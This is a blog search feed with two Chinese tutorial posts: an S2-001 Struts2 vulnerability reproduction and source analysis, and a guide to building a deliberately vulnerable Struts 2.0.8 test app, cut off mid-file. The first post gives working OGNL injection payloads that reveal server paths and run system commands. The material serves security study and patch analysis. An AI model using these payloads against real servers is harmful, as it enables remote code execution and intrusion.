<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java Web安全入门——S2-001漏洞分析</title>
    <link href="/2019/10/29/Java-Web-S2-001/"/>
    <url>/2019/10/29/Java-Web-S2-001/</url>
    
    <content type="html"><![CDATA[<p>Java-Web入门第一篇，S2-001漏洞复现&amp;原理分析</p><a id="more"></a><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p><h2 id="2-Struts2-架构-amp-请求处理流程"><a href="#2-Struts2-架构-amp-请求处理流程" class="headerlink" title="2. Struts2 架构&amp;请求处理流程"></a>2. Struts2 架构&amp;请求处理流程</h2><p><img src="https://image.mengsec.com/struts/s2001/Struts2-Architecture.png" alt="Struts2-Architecture"></p><p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p><ul><li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li><li>Struts Core(浅蓝色)：Struts2的核心部分。</li><li>Interceptors(浅绿色)：Struts2的拦截器。</li><li>User created(浅黄色)：需要开发人员创建的部分。</li></ul><p>图中的一些组件的作用如下：</p><ul><li><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li><li><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li><li><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li><li><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的<code>struts.xml</code>配置文件。</li><li><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li><li><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li><li><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li><li><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li><li><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li><li><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li><li><strong>Tag Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li></ul><p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p><p>当HTTP请求发送个Web服务器之后，Web服务器根据用户的请求以及<code>web.xml</code>中的配置文件，将请求转发给<code>Struts2</code>框架进行处理。</p><ol><li>HTTP请求经过一系列的过滤器，最后到达<code>FilterDispatcher</code>过滤器。</li><li><code>FilterDispatcher</code>将请求转发给<code>ActionMapper</code>，判断该请求是否需要处理。</li><li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个<code>ActionProxy</code>来进行后续的处理。</li><li><code>ActionProxy</code>拿着HTTP请求，询问<code>struts.xml</code>该调用哪一个<code>Action</code>进行处理。</li><li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li><li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li><li>运行<code>Action</code>，生成一个<code>Result</code>。</li><li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li><li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li></ol><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><p>常用Payload</p><p>获取tomcat路径</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">%&#123;<span class="hljs-string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty</span>(<span class="hljs-string">&quot;user.dir&quot;</span>)+<span class="hljs-string">&quot;&#125;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/struts/s2001/image-20191029192106225.png" alt="image-20191029192106225"></p><p>获取Web路径</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/struts/s2001/image-20191029193405016.png" alt="image-20191029193405016"></p><p>执行命令</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">%&#123;#a=(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String[]&#123;<span class="hljs-string">&quot;id&quot;</span>&#125;)</span>).redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>.start<span class="hljs-literal">()</span>,#b=#a.get<span class="hljs-constructor">InputStream()</span>,#c=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">InputStreamReader(#<span class="hljs-params">b</span>)</span>,#d=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">BufferedReader(#<span class="hljs-params">c</span>)</span>,#e=<span class="hljs-keyword">new</span> <span class="hljs-built_in">char</span><span class="hljs-literal">[<span class="hljs-number">50000</span>]</span>,#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.get<span class="hljs-constructor">Writer()</span>.println(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">String(#<span class="hljs-params">e</span>)</span>),#f.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>,#f.get<span class="hljs-constructor">Writer()</span>.close<span class="hljs-literal">()</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/struts/s2001/image-20191029193509211.png" alt="image-20191029193509211"></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4. 漏洞分析"></a>4. 漏洞分析</h2><p>我们就以<code>%&#123;1+1&#125;</code>作为Payload，来分析一下漏洞产生的原因。</p><p>首先给我们自定义的Action上下一个断点，然后发送一个请求。</p><p>从调用栈中，我们可以知道，在<code>DefaultActionInvocation</code>类中反射调用了我们自定义的类<code>LoginAction</code>。</p><p>路径：<code>xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/DefaultActionInvocation.java</code></p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029201816282.png" alt="image-20191029201816282"></p><p>此时到达自定义类<code>LoginAction</code>的<code>username</code>的值为<code>%&#123;1+1&#125;</code>。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029202015653.png" alt="image-20191029202015653"></p><p>从官方公布的漏洞详情中，我们可以知道，漏洞是出现在Struts2重新渲染jsp时，对ognl表达式进行了递归解析，导致了恶意的表达式被执行。</p><p>让我们继续往下跟，直到进入了<code>TextParseUtil</code>中。</p><p>路径：<code>xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">translateVariables</span><span class="hljs-params">(<span class="hljs-keyword">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator)</span> </span>&#123;<br>    <span class="hljs-comment">// deal with the &quot;pure&quot; expressions first!</span><br>    <span class="hljs-comment">//expression = expression.trim();</span><br>    Object result = expression;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>        <span class="hljs-keyword">int</span> start = expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-keyword">int</span> length = expression.length();<br>        <span class="hljs-keyword">int</span> x = start + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">int</span> end;<br>        <span class="hljs-keyword">char</span> c;<br>        <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (start != -<span class="hljs-number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="hljs-number">0</span>) &#123;<br>            c = expression.charAt(x++);<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>                count++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>                count--;<br>            &#125;<br>        &#125;<br>        end = x - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> ((start != -<span class="hljs-number">1</span>) &amp;&amp; (end != -<span class="hljs-number">1</span>) &amp;&amp; (count == <span class="hljs-number">0</span>)) &#123;<br>            String <span class="hljs-keyword">var</span> = expression.substring(start + <span class="hljs-number">2</span>, end);<br><br>            Object o = stack.findValue(<span class="hljs-keyword">var</span>, asType);<br>            <span class="hljs-keyword">if</span> (evaluator != <span class="hljs-keyword">null</span>) &#123;<br>                o = evaluator.evaluate(o);<br>            &#125;<br>            <br><br>            String left = expression.substring(<span class="hljs-number">0</span>, start);<br>            String right = expression.substring(end + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (o != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (TextUtils.stringSet(left)) &#123;<br>                    result = left + o;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result = o;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (TextUtils.stringSet(right)) &#123;<br>                    result = result + right;<br>                &#125;<br><br>                expression = left + o + right;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span><br>                result = left + right;<br>                expression = left + right;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里下了断点之后，程序进入了该方法好几次，而且每次的<code>expression</code>的值也不一样。</p><p>在手册中，我们也可以查到该方法的作用是将变量转换为对象。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029204849689.png" alt="image-20191029204849689"></p><blockquote><p><a href="https://struts.apache.org/maven/struts2-core/apidocs/index.html">https://struts.apache.org/maven/struts2-core/apidocs/index.html</a></p></blockquote><p>当<code>expression</code>为<code>username</code>时，从调用栈中我们可以看到整个调用过程。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029205431561.png" alt="image-20191029205431561"></p><p>读取<code>index.jsp</code>的标签</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029205615826.png" alt="image-20191029205615826"></p><p>通过<code>UIBean</code>将标签解析出来</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029205825958.png" alt="image-20191029205825958"></p><p>然后将其传入到了<code>translateVariables</code>方法中。</p><p>经过两次调用之后，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br></code></pre></td></tr></table></figure><p>传入的<code>expression</code>的值变为了<code>%&#123;username&#125;</code>。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029210131255.png" alt="image-20191029210131255"></p><p>在后面的<code>findValue</code>方法中获得了我们传入的Payload<code>%&#123;1+1&#125;</code>，然后将其存入到了<code>o</code>中。</p><p>继续往下走，<code>%&#123;1+1&#125;</code>还是满足ognl表达式的规则，于是又进行了一次调用。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029210311489.png" alt="image-20191029210311489"></p><p>此时的<code>expression</code>的值为<code>%&#123;1+1&#125;</code>，在后面使用<code>findValue</code>对表达式进行了解析，返回的值<code>2</code>。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029210808496.png" alt="image-20191029210808496"></p><p>在这之后，<code>2</code>这个值是不满足表达式的规则，于是直接将值进行了返回。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029210948730.png" alt="image-20191029210948730"></p><p>由于没有进行验证，导致我们的输入<code>%&#123;1+1&#125;</code>被程序错误的当做了表达式进行了解析，返回了值<code>2</code>，最终显示在响应的表单中。</p><h2 id="5-补丁分析"><a href="#5-补丁分析" class="headerlink" title="5. 补丁分析"></a>5. 补丁分析</h2><p>通过对比xwork2.0.3和2.0.4版本的源码，我们很容易可以发现区别。</p><p><img src="https://image.mengsec.com/struts/s2001/image-20191029213426397.png" alt="image-20191029213426397"></p><p>添加了一个<code>maxLoopCount</code>属性，限制了递归解析的最大数目。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (loopCount &gt; maxLoopCount) &#123;<br>    <span class="hljs-comment">// translateVariables prevent infinite loop / expression recursive evaluation</span><br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>从而在解析到<code>%&#123;1+1&#125;</code>时，不会继续向下递归了，这样就修复了该漏洞。</p><h2 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h2><ul><li><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/</a></li><li><a href="https://chybeta.github.io/2018/02/06/[struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97]S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></li><li><a href="https://seaii-blog.com/index.php/2019/09/20/90.html">https://seaii-blog.com/index.php/2019/09/20/90.html</a></li><li><a href="https://struts.apache.org/core-developers/big-picture">https://struts.apache.org/core-developers/big-picture</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java-Web</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java Web安全入门——S2漏洞测试环境搭建</title>
    <link href="/2019/10/29/Java-Web-Struts2-Env-Build/"/>
    <url>/2019/10/29/Java-Web-Struts2-Env-Build/</url>
    
    <content type="html"><![CDATA[<p>最近准备入坑Java安全，先从最经典的Struts2漏洞开始吧</p><a id="more"></a><h2 id="1-测试环境简介"><a href="#1-测试环境简介" class="headerlink" title="1. 测试环境简介"></a>1. 测试环境简介</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MacOS</span> <span class="hljs-number">10</span>.<span class="hljs-number">15</span><br><span class="hljs-attribute">Java</span> <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>_<span class="hljs-number">191</span><br><span class="hljs-attribute">IDEA</span> <span class="hljs-number">2019</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Tomcat</span> <span class="hljs-number">9</span>.<span class="hljs-number">0</span>.<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><h2 id="2-具体操作步骤"><a href="#2-具体操作步骤" class="headerlink" title="2. 具体操作步骤"></a>2. 具体操作步骤</h2><p>第一步，创建一个Maven项目，如图所示，勾选<code>Create from archetype</code>，并且选择下面的<code>webapp</code>。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028204945920.png" alt="image-20191028204945920"></p><p>点击<code>Next</code>。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028205104917.png" alt="image-20191028205104917"></p><p>在这里，<code>GroupId</code>和<code>ArtifactId</code>自定义就好，剩下的一路<code>Next</code>。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028205254286.png" alt="image-20191028205254286"></p><p>项目创建完毕后，选择右下角的<code>Enable Auto-Import</code>，然后等待<code>Maven</code>构建完毕。</p><p>我们刚刚创建完毕的项目如图所示。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028205534771.png" alt="image-20191028205534771"></p><p>接下来我们分别添加并配置Maven的<code>pom.xml</code>，Tomcat的<code>web.xml</code>，Struts2的<code>struts.xml</code>。</p><p>在main目录下创建一个java文件夹，里面放置我们自定义的java类文件，如果IDEA没有将java文件夹标识为资源文件夹的话，可以在文件夹上右键，将其标识为资源文件夹。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028210132922.png" alt="image-20191028210132922"></p><p>在里面我们创建自定义的Java Package。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028210415377.png" alt="image-20191028210415377"></p><p>然后在其中创建一个名为<code>LoginAction</code>的Java类，内容为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mengsec.s2001.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> String password = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.isEmpty()) || (<span class="hljs-keyword">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>))<br>                &amp;&amp; (<span class="hljs-keyword">this</span>.password.equals(<span class="hljs-string">&quot;admin&quot;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来修改<code>pom.xml</code>，添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加这个配置之后，Maven会自动将对应版本的Jar包下载导入，不需要手工配置了，但是这里有个小坑。</p><p>IDEA默认不会自动编译发布Java文件夹中的资源文件，可以在<code>pom.xml</code>的<code>build</code>标签中添加以下配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再修改<code>web.xml</code>，在这里主要是配置<code>struts2</code>的过滤器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-001 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>webapp</code>目录下创建&amp;修改两个文件——<code>index.jsp</code>&amp;<code>welcome.jsp</code>，内容如下。</p><p><strong>index.jsp</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-001 Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span><br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>    &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><strong>welcome.jsp</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 